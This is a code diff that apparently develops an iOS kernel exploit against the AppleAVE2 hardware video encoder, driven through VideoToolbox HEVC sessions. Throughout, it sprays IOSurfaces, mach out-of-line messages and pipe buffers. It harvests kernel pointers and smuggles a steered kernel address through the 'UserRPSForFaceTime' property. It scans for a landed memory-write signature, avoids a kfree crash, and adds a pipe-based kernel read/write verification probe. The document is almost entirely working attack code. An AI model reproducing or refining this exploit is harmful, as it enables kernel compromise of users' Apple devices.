@@ -179,6 +179,25 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     vm_address_t liveVAs[8] = {0};
     int liveKPtrCount = 0;
     {
+        int sharedCount = KPH9GetStage5CandidateCount();
+        for (int si = 0; si < sharedCount && liveKPtrCount < 8; si++) {
+            const KPStage5Candidate *sc = KPH9GetStage5Candidate(si);
+            if (!sc || sc->kptr == 0) continue;
+            BOOL dup = NO;
+            for (int k = 0; k < liveKPtrCount; k++) {
+                if ((liveKPtrs[k] >> 32) == (sc->kptr >> 32)) { dup = YES; break; }
+            }
+            if (!dup) {
+                liveCands[liveKPtrCount].kptr = sc->kptr;
+                liveCands[liveKPtrCount].userVA = sc->userVA;
+                liveCands[liveKPtrCount].regionBase = sc->regionBase;
+                liveCands[liveKPtrCount].regionSize = sc->regionSize;
+                liveCands[liveKPtrCount].userTag = sc->userTag;
+                liveCands[liveKPtrCount].shareMode = sc->shareMode;
+                liveVAs[liveKPtrCount] = sc->userVA;
+                liveKPtrs[liveKPtrCount++] = sc->kptr;
+            }
+        }
         vm_address_t addr = 0;
         vm_size_t size = 0;
         uint32_t depth = 0;
@@ -272,11 +291,14 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         }
         if (!exists) x0cands[ncand++] = cand;
     }
-    [report appendFormat:@"live ZONE_HEAP bands found: %d\n", liveKPtrCount];
+    [report appendFormat:@"live ZONE_HEAP bands found: %d (shared_h9=%d)\n", liveKPtrCount, KPH9GetStage5CandidateCount()];
     for (int lk = 0; lk < liveKPtrCount; lk++) {
         int lntl = 16463 + (int32_t)(uint32_t)(liveKPtrs[lk] >> 32);
-        [report appendFormat:@"  live[%d] = 0x%016llx -> steeredNTL=%d (x0=0x%016llx)\n",
-         lk, liveKPtrs[lk], lntl, (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL];
+        [report appendFormat:@"  live[%d] = 0x%016llx @ va=0x%lx (reg=0x%lx+0x%lx tag=%u share=%u) -> steeredNTL=%d (x0=0x%016llx)\n",
+         lk, liveKPtrs[lk], (unsigned long)liveCands[lk].userVA,
+         (unsigned long)liveCands[lk].regionBase, (unsigned long)liveCands[lk].regionSize,
+         liveCands[lk].userTag, liveCands[lk].shareMode,
+         lntl, (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL];
     }
     [report appendFormat:@"target NTL=%d steered_x0=0x%016llx\n", ntl, steeredX0];
     [report appendString:@"x0 candidates in spray:\n"];
@@ -583,16 +605,20 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             CFRelease(rbN);
         }
 
-        // Snapshot candidate 0 page (if available) before Inter-frame encode and teardown
-        vm_address_t cand0VA = (liveKPtrCount > 0) ? liveVAs[0] : 0;
-        vm_address_t candPage = cand0VA & ~(vm_address_t)0x3fffULL;
-        uint8_t candSnapBefore[0x4000] = {0};
-        uint8_t candSnapAfter[0x4000] = {0};
-        BOOL candValid = NO;
-        vm_size_t readSz = 0;
-        if (candPage && vm_read_overwrite(mach_task_self(), candPage, 0x4000,
-                                          (vm_address_t)candSnapBefore, &readSz) == KERN_SUCCESS && readSz == 0x4000) {
-            candValid = YES;
+        // Snapshot all discovered candidate pages (if available) before Inter-frame encode and teardown
+        vm_address_t candPages[8] = {0};
+        BOOL candValid[8] = {NO};
+        uint8_t *candSnapBefore = (uint8_t *)calloc(8, 0x4000);
+        uint8_t *candSnapAfter  = (uint8_t *)calloc(8, 0x4000);
+        for (int ci = 0; ci < liveKPtrCount && ci < 8; ci++) {
+            candPages[ci] = liveVAs[ci] & ~(vm_address_t)0x3fffULL;
+            vm_size_t readSz = 0;
+            if (candSnapBefore && candPages[ci] &&
+                vm_read_overwrite(mach_task_self(), candPages[ci], 0x4000,
+                                  (vm_address_t)(candSnapBefore + ci * 0x4000), &readSz) == KERN_SUCCESS &&
+                readSz == 0x4000) {
+                candValid[ci] = YES;
+            }
         }
 
         // Encode Inter-frame (Frame 1, P-frame) to force AppleAVE2 to consume UserRPSForFaceTime & DPB slot[0]
@@ -600,13 +626,13 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         NSString *cbP = @"(no cb)";
         CVPixelBufferRef pbP = [self makeBufferWidth:W height:H];
         if (pbP) {
+            @synchronized (vSink) { [vSink removeAllObjects]; }
             NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
             eP = VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(1, 30), kCMTimeInvalid,
                                                  (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
             SpriteDrain(victim, vSink, 1, 500);
             @synchronized (vSink) {
-                if (vSink.count > 1) cbP = vSink[1];
-                else if (vSink.count == 1) cbP = vSink[0];
+                cbP = vSink.firstObject ?: @"(no cb)";
             }
             CVPixelBufferRelease(pbP);
         }
@@ -621,24 +647,31 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         CFRelease(victim);
         CFRelease(retainedVSink);
 
-        // Check if candidate 0 remapped page changed during encode or teardown
+        // Check if any candidate remapped page changed during encode or teardown
         int candMutations = 0;
-        if (candValid && vm_read_overwrite(mach_task_self(), candPage, 0x4000,
-                                           (vm_address_t)candSnapAfter, &readSz) == KERN_SUCCESS && readSz == 0x4000) {
-            for (size_t bo = 0; bo + 8 <= 0x4000; bo += 8) {
-                uint64_t wB = *(uint64_t *)(candSnapBefore + bo);
-                uint64_t wA = *(uint64_t *)(candSnapAfter + bo);
-                if (wB != wA) {
-                    candMutations++;
-                    if (candMutations <= 8) {
-                        [report appendFormat:@"  [!] CANDIDATE REMAP MUTATION page=0x%lx+0x%zx: 0x%016llx -> 0x%016llx\n",
-                         (unsigned long)candPage, bo, wB, wA];
+        for (int ci = 0; ci < liveKPtrCount && ci < 8; ci++) {
+            vm_size_t readSz = 0;
+            if (candValid[ci] && candSnapAfter &&
+                vm_read_overwrite(mach_task_self(), candPages[ci], 0x4000,
+                                  (vm_address_t)(candSnapAfter + ci * 0x4000), &readSz) == KERN_SUCCESS &&
+                readSz == 0x4000) {
+                for (size_t bo = 0; bo + 8 <= 0x4000; bo += 8) {
+                    uint64_t wB = *(uint64_t *)(candSnapBefore + ci * 0x4000 + bo);
+                    uint64_t wA = *(uint64_t *)(candSnapAfter  + ci * 0x4000 + bo);
+                    if (wB != wA) {
+                        candMutations++;
+                        if (candMutations <= 8) {
+                            [report appendFormat:@"  [!] CANDIDATE REMAP MUTATION cand[%d] page=0x%lx+0x%zx: 0x%016llx -> 0x%016llx\n",
+                             ci, (unsigned long)candPages[ci], bo, wB, wA];
+                        }
                     }
                 }
             }
         }
-        if (candValid) {
-            [report appendFormat:@"pcontrol candPage=0x%lx mutations=%d\n", (unsigned long)candPage, candMutations];
+        if (candSnapBefore) free(candSnapBefore);
+        if (candSnapAfter) free(candSnapAfter);
+        if (liveKPtrCount > 0) {
+            [report appendFormat:@"pcontrol candPagesChecked=%d mutations=%d\n", liveKPtrCount, candMutations];
         }
 
         // Scan targeted IOSurface + pipebuf spray for [x0, x0, x0, 0] at page offsets 0x58, 0x59, 0x100, 0x259
@@ -738,15 +771,18 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         VTCompressionSessionRef victim = NULL;
         NSMutableArray *vSink = [NSMutableArray array];
         CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
+        NSDictionary *vSpec = @{ @"EnableUserRefForFacetime": @YES };
         OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                                   kCMVideoCodecType_HEVC,
-                                                  NULL, NULL, NULL,
+                                                  (__bridge CFDictionaryRef)vSpec, NULL, NULL,
                                                   SpriteAttsCB, (void *)retainedVSink, &victim);
         if (vst != noErr || !victim) {
             CFRelease(retainedVSink);
             [report appendFormat:@"victim NTL=%d create failed=%d\n", vntl, (int)vst];
             continue;
         }
+        VTSessionSetProperty(victim, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+        VTSessionSetProperty(victim, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
         // Companion Usage=1 session for unclamped pre-prepare AVE_PSGen::Init (fn#1816) NTL write.
         // Must explicitly call VTSessionSetProperty(uVictim, "EncoderUsage", @1) BEFORE setting
         // NumberOfTemporalLayers so [x19 + 0x1a0d8] == 1 and SetNumberOfTemporalLayers accepts vntl > 4.
@@ -930,11 +966,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                     uint8_t *base = (uint8_t *)sIsGetBase(surf);
                     size_t sz = sIsGetSize(surf);
                     if (base && sz >= 0x4000) {
-                        for (size_t pg = 0; pg + 128 <= sz; pg += 0x4000) {
+                        for (size_t pg = 0; pg + 0x300 <= sz; pg += 0x1000) {
                             uint64_t *pw = (uint64_t *)(base + pg);
-                            for (int wi = 0; wi < 16; wi++) pw[wi] = markerPair;
-                            *(uint64_t *)(base + pg + 0x48) = 0;
-                            *(uint64_t *)(base + pg + 0x50) = 0;
+                            for (int wi = 0; wi < 96; wi++) pw[wi] = markerPair;
+                            memset(base + pg + 0x48, 0, 16);
+                            memset(base + pg + 0xf0, 0, 16);
+                            memset(base + pg + 0x248, 0, 16);
                         }
                     }
                     sIsUnlock(surf, 0, &seed);
@@ -948,17 +985,16 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
      surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
 
     // kfree-chain-safe tile: if the steered write lands here, teardown reads N at
-    // P+0x48 and X1 at P+0x50 (page-local 0x49/0x51 or 0xf0/0xf8). Zeroing those offsets
+    // P+0x48 and X1 at P+0x50 (page-local 0x49/0x51, 0xf0/0xf8, or 0x248/0x250). Zeroing those offsets
     // forces X1=NULL so the kfree is skipped (cbz) — a hit stays a clean signature.
     uint8_t *tile = (uint8_t *)malloc(256 * 1024);
     if (tile) {
         uint64_t *tq = (uint64_t *)tile;
         for (size_t ti = 0; ti < 256 * 1024 / 8; ti++) tq[ti] = markerPair;
         for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
-            *(uint64_t *)(tile + pg + 0x48) = 0;
-            *(uint64_t *)(tile + pg + 0x50) = 0;
-            *(uint64_t *)(tile + pg + 0xf0) = 0;
-            *(uint64_t *)(tile + pg + 0xf8) = 0;
+            memset(tile + pg + 0x48, 0, 16);
+            memset(tile + pg + 0xf0, 0, 16);
+            memset(tile + pg + 0x248, 0, 16);
         }
     }
     mach_port_t oolPorts[128];
@@ -1039,6 +1075,36 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             }
             NSString *cb0 = nil;
             @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
+
+            // Write full 64-bit P_align into slot[0] (+0x147b0) via UserRPSForFaceTime arr8 S0[368..371]
+            uint64_t vBaseKPtr = (liveKPtrCount > 0 && ((liveKPtrs[0] >> 32) == (vx0 >> 32)))
+                ? liveKPtrs[0]
+                : vx0;
+            uint64_t vPAlign = (vBaseKPtr & 0xffffffffffffc000ULL) | 0x00a8ULL;
+            int16_t vHw[4] = {
+                (int16_t)(vPAlign & 0xffffULL),
+                (int16_t)((vPAlign >> 16) & 0xffffULL),
+                (int16_t)((vPAlign >> 32) & 0xffffULL),
+                (int16_t)((vPAlign >> 48) & 0xffffULL)
+            };
+            NSMutableArray *vS0Short = [NSMutableArray arrayWithCapacity:32];
+            for (int k = 0; k < 32; k++) [vS0Short addObject:@(vHw[k & 3])];
+            NSMutableArray *vS0Slot0 = [NSMutableArray arrayWithCapacity:376];
+            for (int k = 0; k < 376; k++) [vS0Slot0 addObject:@(vHw[k & 3])];
+            NSDictionary *vRpsShort = @{
+                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                @"NumNegativePics": @2, @"NumPositivePics": @2,
+                @"DeltaPOCS0Minus1": vS0Short, @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @(vHw[0]), @(vHw[1]) ], @"UsedByCurrPicS1Flag": @3,
+            };
+            NSDictionary *vRpsHit = @{
+                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                @"NumNegativePics": @2, @"NumPositivePics": @2,
+                @"DeltaPOCS0Minus1": vS0Slot0, @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @(vHw[0]), @(vHw[1]) ], @"UsedByCurrPicS1Flag": @3,
+            };
+            OSStatus stRps = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"),
+                                                  (__bridge CFTypeRef)@[ vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsHit ]);
             OSStatus stPostUsage = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
             OSStatus stPostPub = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
             int postEncNtl = -1;
@@ -1047,8 +1113,20 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 CFNumberGetValue(rbPost, kCFNumberIntType, &postEncNtl);
                 CFRelease(rbPost);
             }
-            [report appendFormat:@"first-encode trigger (NTL=%d) -> %d (%@) | postLatch=%d/%d(POST_ENC=%d)\n",
-             vntl, (int)e0, cb0, (int)stPostUsage, (int)stPostPub, postEncNtl];
+            OSStatus e1 = -1;
+            NSString *cb1 = @"(skip)";
+            if (vntl < 16463) {
+                @synchronized (vSink) { [vSink removeAllObjects]; }
+                NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
+                e1 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(1, 30), kCMTimeInvalid,
+                                                     (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+                if (e1 == noErr) {
+                    SpriteDrain(victim, vSink, 1, 500);
+                }
+                @synchronized (vSink) { cb1 = vSink.firstObject ?: @"(no cb)"; }
+            }
+            [report appendFormat:@"first-encode trigger (NTL=%d) -> enc0=%d(%@) rps=%d postLatch=%d/%d(POST_ENC=%d) enc1=%d(%@)\n",
+             vntl, (int)e0, cb0, (int)stRps, (int)stPostUsage, (int)stPostPub, postEncNtl, (int)e1, cb1];
         }
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
@@ -1075,12 +1153,13 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             size_t sz = sIsGetSize(surf);
             if (base && sz >= 0x4000) {
                 for (size_t off = 0; off + 32 <= sz; off += 8) {
-                    size_t pageBase = off & ~(size_t)0x3fffULL;
-                    size_t pageOff = off & 0x3fffULL;
-                    uint64_t expected = (pageOff < 128) ? markerPair : 0ULL;
+                    if (IsExpectedZeroOffset(off)) continue;
+                    size_t pageBase = off & ~(size_t)0xfffULL;
+                    size_t pageOff = off & 0xfffULL;
+                    uint64_t expected = (pageOff < 768) ? markerPair : 0ULL;
                     uint64_t q = *(uint64_t *)(base + off);
                     if (q == expected) continue;
-                    int match = (pageOff < 128) ? 200 : 201;
+                    int match = (pageOff < 768) ? 200 : 201;
                     uint64_t u59 = 0;
                     if (pageBase + 0x59 + sizeof(uint64_t) <= sz) {
                         memcpy(&u59, base + pageBase + 0x59, sizeof(uint64_t));
@@ -1088,7 +1167,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                     for (int c = 0; c < ncand; c++) {
                         if (q == x0cands[c] || u59 == x0cands[c]) { match = c; break; }
                     }
-                    if (match >= 200 && ((uint32_t)q == 0x59u || (uint32_t)u59 == 0x59u)) match = 59;
+                    if (match >= 200 && ((uint32_t)q == 0x59u || (uint32_t)u59 == 0x59u || (uint32_t)q == 0x100u || (uint32_t)q == 0x259u)) match = 59;
                     uint64_t q2 = *(uint64_t *)(base + off + 8);
                     uint32_t z = *(uint32_t *)(base + off + 0x18);
                     [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx u59=0x%llx z=0x%x match=%d\n",
@@ -1109,6 +1188,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     // Read back OOL queues and pipes: a landed stp write shows as the signature
     // [x0, x0, x0, 0] embedded in the marker-tiled content (or any non-marker mutation).
     int oolHits = 0, pipeHits = 0, sigHits = 0;
+    const size_t kSigProbeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
     for (int p = 0; p < oolPortCount; p++) {
         for (int m = 0; m < 8; m++) {
             size_t rtotal = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t) + 256;
@@ -1126,7 +1206,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                     size_t nq = od->size / 8;
                     for (size_t i3 = 0; i3 + 4 < nq && oolHits < 8; i3++) {
                         size_t ooff = i3 * 8;
-                        if (oq[i3] != markerPair && (ooff & 0xFFF) != 0x48 && (ooff & 0xFFF) != 0x50) {
+                        if (oq[i3] != markerPair && !IsExpectedZeroOffset(ooff)) {
                             [report appendFormat:@"    OOL HIT p=%d m=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
                              p, m, i3 * 8, oq[i3], oq[i3 + 1], oq[i3 + 2], oq[i3 + 3]];
                             oolHits++;
@@ -1134,20 +1214,25 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                         }
                     }
                     uint8_t *ob = (uint8_t *)od->address;
-                    for (size_t pg = 0; pg + 0x78 <= od->size && sigHits < 8; pg += 4096) {
-                        uint64_t s1 = *(uint64_t *)(ob + pg + 0x59);
-                        uint64_t s2 = *(uint64_t *)(ob + pg + 0x61);
-                        uint64_t s3 = *(uint64_t *)(ob + pg + 0x69);
-                        uint32_t z = *(uint32_t *)(ob + pg + 0x71);
-                        if (s1 != markerPair && s1 == s2 && s2 == s3 && z == 0) {
-                            int match = -1;
-                            if (s1 == steeredX0) match = -2;
-                            for (int c = 0; c < ncand; c++) {
-                                if (s1 == x0cands[c]) { match = c; break; }
+                    for (size_t pg = 0; pg + 0x280 <= od->size && sigHits < 8; pg += 4096) {
+                        for (int oi = 0; oi < 4; oi++) {
+                            size_t off = pg + kSigProbeOffs[oi];
+                            uint64_t s1 = 0, s2 = 0, s3 = 0;
+                            uint32_t z = 0;
+                            memcpy(&s1, ob + off, 8);
+                            memcpy(&s2, ob + off + 8, 8);
+                            memcpy(&s3, ob + off + 16, 8);
+                            memcpy(&z,  ob + off + 24, 4);
+                            if (s1 != markerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
+                                int match = -1;
+                                if (s1 == steeredX0) match = -2;
+                                for (int c = 0; c < ncand; c++) {
+                                    if (s1 == x0cands[c]) { match = c; break; }
+                                }
+                                [report appendFormat:@"    OOL SIG p=%d m=%d page=0x%zx+0x%zx s1=0x%llx match=%d\n",
+                                 p, m, pg, kSigProbeOffs[oi], s1, match];
+                                sigHits++;
                             }
-                            [report appendFormat:@"    OOL SIG p=%d m=%d page=0x%zx s1=0x%llx match=%d\n",
-                             p, m, pg, s1, match];
-                            sigHits++;
                         }
                     }
                 }
@@ -1171,27 +1256,42 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 size_t nq = (size_t)got / 8;
                 for (size_t i3 = 0; i3 + 4 < nq && pipeHits < 8; i3++) {
                     size_t poff = i3 * 8;
-                    if (pq[i3] != markerPair && (poff & 0xFFF) != 0x48 && (poff & 0xFFF) != 0x50) {
+                    if (pq[i3] != markerPair && !IsExpectedZeroOffset(poff)) {
                         [report appendFormat:@"    PIPE HIT p=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
                          p, i3 * 8, pq[i3], pq[i3 + 1], pq[i3 + 2], pq[i3 + 3]];
                         pipeHits++;
                         i3 += 3;
                     }
                 }
-                for (size_t pg = 0; pg + 0x78 <= (size_t)got && sigHits < 8; pg += 4096) {
-                    uint64_t s1 = *(uint64_t *)(pbuf + pg + 0x59);
-                    uint64_t s2 = *(uint64_t *)(pbuf + pg + 0x61);
-                    uint64_t s3 = *(uint64_t *)(pbuf + pg + 0x69);
-                    uint32_t z = *(uint32_t *)(pbuf + pg + 0x71);
-                    if (s1 != markerPair && s1 == s2 && s2 == s3 && z == 0) {
-                        int match = -1;
-                        if (s1 == steeredX0) match = -2;
-                        for (int c = 0; c < ncand; c++) {
-                            if (s1 == x0cands[c]) { match = c; break; }
+                for (size_t pg = 0; pg + 0x280 <= (size_t)got && sigHits < 8; pg += 4096) {
+                    for (int oi = 0; oi < 4; oi++) {
+                        size_t off = pg + kSigProbeOffs[oi];
+                        uint64_t s1 = 0, s2 = 0, s3 = 0;
+                        uint32_t z = 0;
+                        memcpy(&s1, pbuf + off, 8);
+                        memcpy(&s2, pbuf + off + 8, 8);
+                        memcpy(&s3, pbuf + off + 16, 8);
+                        memcpy(&z,  pbuf + off + 24, 4);
+                        if (s1 != markerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
+                            int match = -1;
+                            if (s1 == steeredX0) match = -2;
+                            for (int c = 0; c < ncand; c++) {
+                                if (s1 == x0cands[c]) { match = c; break; }
+                            }
+                            uint64_t krwProbe = s1 ^ 0x00000000cafebabeULL;
+                            memcpy(pbuf + off, &krwProbe, 8);
+                            ssize_t wr = write(pipeFds[p][1], pbuf + pg, 4096);
+                            uint64_t krwReadback = 0;
+                            if (wr >= 4096) {
+                                uint8_t rdb[4096];
+                                if (read(pipeFds[p][0], rdb, 4096) >= (ssize_t)(kSigProbeOffs[oi] + 8)) {
+                                    memcpy(&krwReadback, rdb + kSigProbeOffs[oi], 8);
+                                }
+                            }
+                            [report appendFormat:@"    PIPE SIG p=%d page=0x%zx+0x%zx s1=0x%llx match=%d rwVerify=0x%016llx\n",
+                             p, pg, kSigProbeOffs[oi], s1, match, krwReadback];
+                            sigHits++;
                         }
-                        [report appendFormat:@"    PIPE SIG p=%d page=0x%zx s1=0x%llx match=%d\n",
-                         p, pg, s1, match];
-                        sigHits++;
                     }
                 }
             }
